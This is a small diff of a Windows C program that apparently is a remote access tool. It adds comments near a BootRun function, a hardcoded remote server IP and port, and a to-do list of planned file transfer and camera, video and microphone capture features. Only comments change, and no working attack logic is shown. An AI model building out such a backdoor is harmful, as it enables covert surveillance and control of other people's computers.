@@ -18,6 +18,7 @@ int sock;
 // file transfer feature
 // real time camera, video, microphone
 // make a menu for different options on the server
+// proper commenting will be added to the program
 
 int BootRun()
 {
@@ -132,7 +133,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lmCmdLine, int 
     char *serv_ip;
     WSADATA wsa_data;
 
-    serv_ip = "192.168.0.106";
+    serv_ip = "192.168.0.106";//ip of remote server
     serv_port = 12345;
 
     if(WSAStartup(MAKEWORD(2,0), &wsa_data)!=0)
